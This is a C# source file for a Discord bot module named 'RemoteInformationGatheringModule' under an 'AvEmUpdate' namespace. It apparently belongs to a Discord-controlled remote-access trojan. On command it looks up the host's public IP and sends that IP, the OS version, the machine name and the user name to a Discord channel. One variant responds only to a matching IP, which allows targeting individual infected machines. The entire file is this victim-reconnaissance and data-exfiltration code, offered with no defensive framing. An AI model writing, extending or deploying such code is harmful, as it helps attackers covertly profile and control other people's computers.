using Discord.Commands;
using System.Threading.Tasks;
using System;
using System.Net;

namespace AvEmUpdate.Modules
{
    public class RemoteInformationGatheringModule : ModuleBase<SocketCommandContext>
    {
        public string getBotIp()
        {
            WebClient webClient = new WebClient();
            return webClient.DownloadString("http://icanhazip.com");
        }

        [Command("Info")]
        public async Task Info()
        {
            await Context.Channel.SendMessageAsync("```" + getBotIp().Trim() + " " + Environment.OSVersion + " " + Environment.MachineName + " " + Environment.UserName + "```");
        }

        [Command("Info")]
        public async Task Info(string botIp)
        {
            if (botIp.Trim() == getBotIp().Trim())
            {
                await Context.Channel.SendMessageAsync("```" + getBotIp() + " " + Environment.OSVersion + " " + Environment.MachineName + " " + Environment.UserName + "```");
            }
        }
    }
}
